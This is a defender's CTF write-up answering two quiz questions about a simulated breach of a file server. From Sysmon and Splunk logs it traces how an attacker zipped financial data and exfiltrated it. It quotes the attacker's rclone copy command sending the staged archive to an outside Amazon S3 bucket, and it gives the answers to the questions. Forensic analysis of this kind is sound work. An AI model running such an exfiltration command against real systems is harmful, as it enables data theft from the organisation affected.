# 🕵️ CTF Investigation Write-Up

---
## Q18 — What **tool** did the attacker use to exfiltrate data?

### Investigation Steps

1. I continued investigating activity on the compromised file server:

   ```spl
   Computer=mer-fs01.corp.local
   ```

2. I first identified a Sysmon Event ID `11` event, which records file-creation activity.

3. The `TargetFilename` field showed that the attacker created the following archive shortly before the exfiltration tool executed:

   ```text
   C:\ProgramData\microsoft\fin_eng.zip
   ```

4. The `.zip` archive likely represents collected data staged for exfiltration.

5. I then identified a Sysmon Event ID `1` process-creation event containing the following command:

   ```text
   rclone.exe copy C:\ProgramData\microsoft remote:mer-backup-9f2 --transfers 8 --s3-provider AWS
   ```

6. The command uses `rclone.exe` to copy data from the local system to a remote cloud-storage destination.

| Field | Value |
|---|---|
| Host | `mer-fs01.corp.local` |
| Archive Created | `C:\ProgramData\microsoft\fin_eng.zip` |
| Archive Event ID | `11` |
| Process Event ID | `1` |
| Exfiltration Tool | `rclone.exe` |
| Timestamp | `July 1, 2025 @ 05:26:30.728` |

**Answer:** `rclone.exe`

---

## Q19 — To what **cloud service** was the data exfiltrated?

### Investigation Steps

1. I investigated network activity immediately after the `rclone.exe` process executed.

2. Seconds after the exfiltration command, I identified a successful upload request to the following host:

   ```text
   mer-backup-9f2.s3.amazonaws.com
   ```

3. The network event used the HTTP `PUT` method with a successful `200` status code.

4. The URL included the staged archive name:

   ```text
   fin_eng.zip
   ```

5. An HTTP `PUT` request indicates that the archive was uploaded to the remote destination.

| Field | Value |
|---|---|
| Host | `mer-backup-9f2[.]s3[.]amazonaws[.]com` |
| Cloud Service | `Amazon S3` |
| HTTP Method | `PUT` |
| Status Code | `200` |
| Uploaded File | `fin_eng.zip` |
| Timestamp | `July 1, 2025 @ 05:26:37.173` |

**Answer:** `amazonaws`
